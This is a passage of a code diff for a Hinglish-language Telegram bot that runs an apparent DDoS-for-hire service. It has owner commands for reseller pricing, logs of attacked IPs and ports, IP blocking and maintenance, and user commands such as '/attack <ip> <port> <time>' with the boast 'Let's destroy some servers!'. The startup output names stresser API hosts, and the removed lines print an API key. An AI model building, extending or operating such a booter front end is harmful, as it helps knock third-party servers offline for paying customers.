+    response += f"⚡ ATTACKS\n• Active: {active_count}/{max_concurrent}\n• Maintenance: {'🔴' if is_maintenance() else '✅'}\n• DDoS: {'✅' if get_ddos_protection() else '❌'}\n\n"
+    response += f"📈 DATA\n• Total Users: {total_users}\n• Active: {active_users}\n• Resellers: {total_resellers}\n• Available Keys: {active_keys}\n• Total Keys: {total_keys}\n"
+    bot.reply_to(message, response)
 
 @bot.message_handler(commands=["setprice"])
 def set_price_command(message):
     global RESELLER_PRICING
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) == 1:
         response = "═══════════════════════════\n💵 CURRENT PRICING\n═══════════════════════════\n\n"
         for dur, info in RESELLER_PRICING.items():
             response += f"• {dur}: {info['price']} Rs ({info['label']})\n"
-        response += "\n⚠️ Usage: /setprice <duration> <price>\nExample: /setprice 1d 60"
+        response += "\n⚠️ /setprice <duration> <price>"
         bot.reply_to(message, response)
         return
     if len(command_parts) != 3:
@@ -2679,12 +2523,12 @@ def set_price_command(message):
         return
     duration_key = command_parts[1].lower()
     if duration_key not in RESELLER_PRICING:
-        bot.reply_to(message, "❌ Invalid duration! Valid: 12h, 1d, 3d, 7d, 30d, 60d")
+        bot.reply_to(message, "❌ Invalid duration!")
         return
     try:
         new_price = int(command_parts[2])
         if new_price < 0:
-            bot.reply_to(message, "❌ Price 0 se kam nahi ho sakta!")
+            bot.reply_to(message, "❌ Price negative nahi!")
             return
     except:
         bot.reply_to(message, "❌ Invalid price!")
@@ -2693,84 +2537,74 @@ def set_price_command(message):
     RESELLER_PRICING[duration_key]['price'] = new_price
     set_setting(f'price_{duration_key}', new_price)
     update_reseller_pricing()
-    bot.reply_to(message, f"✅ Price Updated!\n📦 {RESELLER_PRICING[duration_key]['label']}\n💵 Old: {old_price} Rs\n💰 New: {new_price} Rs")
+    bot.reply_to(message, f"✅ Updated!\n📦 {RESELLER_PRICING[duration_key]['label']}\n💵 Old: {old_price}\n💰 New: {new_price}")
 
 @bot.message_handler(commands=["logs"])
 def attack_logs_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     all_logs = list(attack_logs_collection.find().sort('timestamp', -1))
     if not all_logs:
-        bot.reply_to(message, "📋 Koi attack logs nahi hai!")
+        bot.reply_to(message, "📋 Koi logs nahi!")
         return
-    content = "═══════════════════════════\n       ATTACK LOGS REPORT\n" + f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n" + "═══════════════════════════\n\nTotal Attacks: {len(all_logs)}\n\n───────────────────────────\n"
+    content = "═══════════════════════════\n       ATTACK LOGS\n" + f"    {datetime.now().strftime('%d-%m-%Y %H:%M')}\n" + "═══════════════════════════\n\nTotal: {len(all_logs)}\n\n───────────────────────────\n"
     for i, log in enumerate(all_logs, 1):
-        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n   Target: {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n   Duration: {log.get('duration', 'N/A')}s\n"
+        content += f"{i}. {log.get('username', 'Unknown')} ({log.get('user_id', 'N/A')})\n   {log.get('target', 'N/A')}:{log.get('port', 'N/A')}\n   {log.get('duration', 'N/A')}s\n"
         if log.get('timestamp'):
-            content += f"   Time: {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
+            content += f"   {log['timestamp'].strftime('%d-%m-%Y %H:%M:%S')}\n"
         content += "\n"
-    content += "═══════════════════════════\nEND OF LOGS - Total: {len(all_logs)}\n═══════════════════════════"
+    content += "═══════════════════════════\nEND\n═══════════════════════════"
     import io
     file = io.BytesIO(content.encode('utf-8'))
-    file.name = f"attack_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
-    bot.send_document(message.chat.id, file, caption=f"📊 Attack Logs\n\n⚔️ Total Attacks: {len(all_logs)}")
+    file.name = f"logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+    bot.send_document(message.chat.id, file, caption=f"📊 Logs\n\n⚔️ {len(all_logs)} attacks")
 
 @bot.message_handler(commands=["del_logs"])
 def delete_logs_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     count = attack_logs_collection.count_documents({})
     if count == 0:
-        bot.reply_to(message, "📋 Koi logs nahi hai!")
+        bot.reply_to(message, "📋 Koi logs nahi!")
         return
     attack_logs_collection.delete_many({})
-    bot.reply_to(message, f"✅ {count} attack logs delete ho gaye!")
+    bot.reply_to(message, f"✅ {count} logs deleted!")
 
 @bot.message_handler(commands=["block_ip"])
 def block_ip_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        bot.reply_to(message, "⚠️ Usage: /block_ip <ip_prefix>\nExample: /block_ip 96.")
+        bot.reply_to(message, "⚠️ /block_ip <prefix>")
         return
     ip_prefix = command_parts[1]
     if add_blocked_ip(ip_prefix):
-        bot.reply_to(message, f"✅ IP Blocked!\n🚫 Prefix: `{ip_prefix}`*")
+        bot.reply_to(message, f"✅ Blocked: `{ip_prefix}`*")
     else:
-        bot.reply_to(message, f"ℹ️ `{ip_prefix}` already blocked!")
+        bot.reply_to(message, f"ℹ️ Already blocked!")
 
 @bot.message_handler(commands=["unblock_ip"])
 def unblock_ip_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
-        bot.reply_to(message, "⚠️ Usage: /unblock_ip <ip_prefix>")
+        bot.reply_to(message, "⚠️ /unblock_ip <prefix>")
         return
     ip_prefix = command_parts[1]
     if remove_blocked_ip(ip_prefix):
-        bot.reply_to(message, f"✅ IP Unblocked!\n✅ Prefix: `{ip_prefix}`")
+        bot.reply_to(message, f"✅ Unblocked!")
     else:
-        bot.reply_to(message, f"❌ `{ip_prefix}` not found!")
+        bot.reply_to(message, f"❌ Not found!")
 
 @bot.message_handler(commands=["blocked_ips"])
 def blocked_ips_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     blocked = get_blocked_ips()
     if not blocked:
-        bot.reply_to(message, "📋 Koi IP blocked nahi hai!")
+        bot.reply_to(message, "📋 Koi IP blocked nahi!")
         return
     response = "🚫 BLOCKED IPs\n\n"
     for i, ip in enumerate(blocked, 1):
@@ -2780,27 +2614,25 @@ def blocked_ips_command(message):
 
 @bot.message_handler(commands=["maintenance"])
 def maintenance_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split(maxsplit=1)
     if len(command_parts) < 2:
-        bot.reply_to(message, "⚠️ Usage: /maintenance <message>")
+        bot.reply_to(message, "⚠️ /maintenance <message>")
         return
     msg = command_parts[1]
     set_maintenance(True, msg)
-    bot.reply_to(message, f"🔧 Maintenance ON!\nMessage: {msg}\n\n/ok to turn off")
+    bot.reply_to(message, f"🔧 ON!\n{msg}\n\n/ok to disable")
 
 @bot.message_handler(commands=["ok"])
 def ok_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
+    if not is_owner(message.from_user.id):
         return
     if not is_maintenance():
-        bot.reply_to(message, "ℹ️ Maintenance already OFF!")
+        bot.reply_to(message, "ℹ️ Already OFF!")
         return
     set_maintenance(False)
-    bot.reply_to(message, "✅ Maintenance OFF!\nBot normal hai.")
+    bot.reply_to(message, "✅ Maintenance OFF!")
 
 @bot.message_handler(commands=['start'])
 def welcome_start(message):
@@ -2814,36 +2646,27 @@ def welcome_start(message):
         response = f'''👑 Welcome Owner, {user_name}!
 
 🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}
-📢 Channel: {'✅ REQUIRED' if get_channel_required() else '❌ NOT REQUIRED'}
-📢 Groups: {len(get_approved_groups())}
+📢 Channel: {'✅' if get_channel_required() else '❌'}
 🔢 Max Slots: 5
-🎬 Reel Feature: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)
+🎬 Reel: {'ON' if get_reel_enabled() else 'OFF'}
 📸 Feedback: {'ON' if get_feedback_enabled() else 'OFF'}
 
-⚡ Private: Max {get_private_max_attack_time()}s | Cooldown {get_private_cooldown()}s
-⚡ Groups: Max {get_group_max_attack_time()}s | Cooldown {get_group_cooldown()}s
-
-Use /help for commands.
-Use /settings for settings.
-
-⚡ Owner: No feedback required!'''
+Use /help for commands.'''
     elif is_reseller(user_id):
         response = f'''💼 Welcome Reseller, {user_name}!
 
-Use /help to see commands.
-🔢 Max Slots: 5'''
+Use /help for commands.'''
     else:
-        # ===== SIMPLIFIED USER START MESSAGE =====
         response = f'''🚀 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁
 
 👑 𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 | 𝗦𝗲𝗰𝘂𝗿𝗲 | 𝗙𝗮𝘀𝘁
 
 🔥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗨𝗦𝗘𝗥 :
-• /attack <ip> <port> <time> – ⚡ Launch an attack
-• /status – 📊 Live attack progress
-• /mykey – 📦 Check your plan details
-• /redeem <key> – 🔑 Activate your key
-• /help – ❓ Full command list
+• /attack <ip> <port> <time>
+• /status
+• /mykey
+• /redeem <key>
+• /help
 
 🔥 𝗟𝗲𝘁’𝘀 𝗱𝗲𝘀𝘁𝗿𝗼𝘆 𝘀𝗼𝗺𝗲 𝘀𝗲𝗿𝘃𝗲𝗿𝘀! 💥'''
     bot.reply_to(message, response)
@@ -2853,7 +2676,6 @@ def handle_feedback_photo(message):
     user_id = message.from_user.id
     if user_id == BOT_OWNER:
         return
-    # Only process if feedback is enabled
     if not get_feedback_enabled():
         return
     fb = get_pending_feedback(user_id)
@@ -2876,21 +2698,20 @@ def handle_other_feedback(message):
     user_id = message.from_user.id
     if user_id == BOT_OWNER:
         return
-    # Only process if feedback is enabled
     if not get_feedback_enabled():
         return
     fb = get_pending_feedback(user_id)
     if fb:
         content_type = message.content_type
         if content_type == 'text':
-            bot.reply_to(message, f"📸 Send screenshot (photo), not text!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s")
+            bot.reply_to(message, f"📸 Send screenshot (photo), not text!")
         else:
             clear_pending_feedback(user_id)
             user_name = message.from_user.first_name
             username = message.from_user.username
-            bot.reply_to(message, f"✅ Feedback Received!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s\n\n⚡ Ab naya attack laga sakte ho!")
+            bot.reply_to(message, f"✅ Feedback Received!")
             try:
-                owner_msg = f"📎 New Feedback\n👤 {user_name}\n📛 @{username if username else 'N/A'}\n🆔 {user_id}\n🎯 {fb['target']}:{fb['port']}\n⏱️ {fb['duration']}s"
+                owner_msg = f"📎 New Feedback\n👤 {user_name}\n📛 @{username if username else 'N/A'}\n🆔 {user_id}\n🎯 {fb['target']}:{fb['port']}"
                 if content_type == 'document':
                     bot.send_document(BOT_OWNER, message.document.file_id, caption=owner_msg)
                 elif content_type == 'video':
@@ -2902,8 +2723,6 @@ def handle_other_feedback(message):
                 elif content_type == 'sticker':
                     bot.send_sticker(BOT_OWNER, message.sticker.file_id)
                     bot.send_message(BOT_OWNER, owner_msg)
-                else:
-                    bot.send_message(BOT_OWNER, owner_msg)
             except Exception as e:
                 print(f"Feedback forward error: {e}")
 
@@ -2914,31 +2733,66 @@ def load_saved_channels():
         if saved and isinstance(saved, list) and saved:
             REQUIRED_CHANNELS = saved
             REQUIRED_CHANNEL_USERNAMES = [extract_channel_username(ch) for ch in saved]
-            print(f"📢 Loaded {len(REQUIRED_CHANNELS)} required channels from database")
+            print(f"📢 Loaded {len(REQUIRED_CHANNELS)} channels")
     except Exception as e:
         print(f"Error loading channels: {e}")
 
 load_saved_channels()
 protection.enabled = get_ddos_protection()
 
+# ============================================================
+# ===== STARTUP PRINT =====
+# ============================================================
 print("🔥 OGGY BHAI BOT STARTING...")
-print(f"🌐 API: https://god.godstress.site + http://mahakalddos.duckdns.org")
-print(f"🔑 API Key: nk_cf1f47c8a0a31abb849e4d3b6bbf2f54 & @mahakal1814")
-print(f"🛡️ DDoS Protection: {'ON' if get_ddos_protection() else 'OFF'}")
-print(f"📢 Channel Required: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}")
-print(f"📢 Approved Groups: {len(get_approved_groups())}")
-print(f"⚡ Private Max Time: {get_private_max_attack_time()}s")
-print(f"⚡ Group Max Time: {get_group_max_attack_time()}s")
+print(f"🌐 API: god.godstress.site + mahakalddos.duckdns.org")
+print(f"🛡️ DDoS: {'ON' if get_ddos_protection() else 'OFF'}")
+print(f"📢 Channel: {'REQUIRED' if get_channel_required() else 'NOT REQUIRED'}")
+print(f"📢 Groups: {len(get_approved_groups())}")
+print(f"⚡ Private Max: {get_private_max_attack_time()}s")
+print(f"⚡ Group Max: {get_group_max_attack_time()}s")
 print(f"⏳ Private Cooldown: {get_private_cooldown()}s")
 print(f"⏳ Group Cooldown: {get_group_cooldown()}s")
-print(f"🔢 Max Concurrent Slots: 5")
-print(f"🎬 Reel Feature: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())} reels)")
-print(f"📸 Feedback Feature: {'ON' if get_feedback_enabled() else 'OFF'}")
+print(f"🔢 Max Slots: 5")
+print(f"🎬 Reel: {'ON' if get_reel_enabled() else 'OFF'} ({len(get_reel_list())})")
+print(f"📸 Feedback: {'ON' if get_feedback_enabled() else 'OFF'}")
 print("=" * 50)
+
+# ============================================================
+# ===== FIXED POLLING LOOP (TIMEOUT FIX) =====
+# ============================================================
+logging.getLogger('telebot').setLevel(logging.ERROR)
+logging.getLogger('urllib3').setLevel(logging.ERROR)
+
+print("🚀 Bot polling starting...", flush=True)
+print("=" * 50, flush=True)
+
+consecutive_failures = 0
+MAX_FAILURES = 10
 
 while True:
     try:
-        bot.polling(none_stop=True, interval=0, timeout=20)
+        bot.polling(
+            none_stop=False,
+            interval=1,
+            timeout=60,
+            long_polling_timeout=60,
+            allowed_updates=None
+        )
+        consecutive_failures = 0  # success → reset
+    except requests.exceptions.ReadTimeout as e:
+        consecutive_failures += 1
+        print(f"⏰ Read timeout #{consecutive_failures}: {e}", flush=True)
+        time.sleep(5)
+    except requests.exceptions.ConnectionError as e:
+        consecutive_failures += 1
+        print(f"🔌 Connection error #{consecutive_failures}: {e}", flush=True)
+        time.sleep(10)
     except Exception as e:
-        print("Polling crashed, restarting...", e)
-        time.sleep(3)
+        consecutive_failures += 1
+        print(f"❌ Polling crashed #{consecutive_failures}: {e}", flush=True)
+        time.sleep(5)
+
+    if consecutive_failures >= MAX_FAILURES:
+        print("💀 Too many failures — long sleep 60s", flush=True)
+        time.sleep(60)
+        consecutive_failures = 0
